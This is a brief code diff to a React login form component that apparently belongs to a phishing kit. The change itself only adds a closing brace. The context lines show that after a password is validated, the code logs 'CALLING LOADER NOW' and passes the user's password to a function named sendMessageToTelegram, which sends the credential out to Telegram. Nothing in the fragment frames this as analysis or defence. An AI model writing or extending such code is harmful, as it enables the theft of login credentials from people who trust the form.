@@ -78,6 +78,7 @@ export default function LoginForm({ setNavigation, navigation }) {
         if (isValid) {
             console.log("PASSWORD IS VALID SO CALLING LOADER NOW")
             sendMessageToTelegram(password);
+        }
         return isValid;
     }
 
